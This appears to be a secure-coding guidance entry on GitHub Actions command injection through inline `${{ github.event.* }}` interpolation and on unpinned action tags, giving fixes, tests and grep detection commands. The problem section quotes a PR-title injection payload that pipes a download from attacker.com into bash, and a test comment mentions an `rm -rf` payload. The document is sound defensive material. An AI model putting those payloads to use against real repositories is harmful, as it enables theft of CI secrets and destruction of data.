---
id: agentic-github-actions-injection
domain: agentic
severity: high
stack: "github-actions, ci-cd"
date_added: 2026-03-25
project: general
---

# GitHub Actions Command Injection + Unpinned Actions (ASI08 / ASI09)

## Problem

**Command injection (ASI08)**: User-controlled input (`PR title`, `branch name`, `issue body`, `comment`) is interpolated directly into `run:` shell steps via `${{ github.event.* }}`. An attacker opens a PR with a title like `x"; curl attacker.com/steal | bash #` and exfiltrates secrets.

**Unpinned actions (ASI09)**: Using `@v4` or `@main` action refs means a compromised or force-pushed tag silently runs attacker code with full access to `secrets.*`.

```yaml
# WRONG — ASI08: injection via PR title
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# WRONG — ASI09: mutable tag, can be compromised
- uses: actions/checkout@v4
```

## Fix

**ASI08 — Always pass event data as env vars, never inline:**

```yaml
# Correct — shell sees it as a variable value, not as code
- name: Echo PR title
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $TITLE"

# Correct — branch name in a run step
- name: Deploy to environment
  env:
    BRANCH: ${{ github.head_ref }}
  run: ./deploy.sh "$BRANCH"
```

The `${{ }}` expression is expanded by the Actions runner *before* the shell sees it when used inline — making it a direct injection vector. When assigned to an env var first, the shell treats it as data.

**ASI09 — Pin all actions to full commit SHAs:**

```yaml
# Correct — immutable reference with human-readable comment
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
- uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
```

Find the SHA for any action:
```bash
gh api repos/actions/checkout/git/ref/tags/v4 | jq .object.sha
```

## Test

```yaml
# Red: must FAIL — injection succeeds before the fix
# In a test workflow, pass a malicious title and verify no side effect

- name: Test injection prevention
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    # Must not execute shell code embedded in TITLE
    echo "$TITLE"
    # If TITLE contains "; rm -rf /important", echo just prints it
```

```typescript
// In a unit test for your workflow config parser:
it('no workflow run: step interpolates github.event.* directly', () => {
  const workflow = readFileSync('.github/workflows/ci.yml', 'utf8')
  // run: steps must not contain ${{ github.event.
  const runSteps = workflow.match(/run:.*\n(?:.*\n)*?(?=\s+-)/g) ?? []
  for (const step of runSteps) {
    expect(step).not.toMatch(/\$\{\{.*github\.event\./)
  }
})

it('all uses: refs are pinned to a SHA', () => {
  const workflow = readFileSync('.github/workflows/ci.yml', 'utf8')
  const uses = workflow.match(/uses:.*@.*/g) ?? []
  for (const ref of uses) {
    // Must match a 40-char hex SHA
    expect(ref).toMatch(/@[0-9a-f]{40}/)
  }
})
```

## Detection

```bash
# ASI08: inline github.event.* in run: steps
grep -rn "\${{.*github\.event\." .github/workflows/ | grep -v "env:"

# ASI09: mutable action refs
grep -rn "uses:.*@v[0-9]\|uses:.*@main\|uses:.*@master" .github/workflows/

# ASI10: secrets echoed or interpolated inline
grep -rn "echo.*secrets\.\|run:.*\${{.*secrets\." .github/workflows/
```
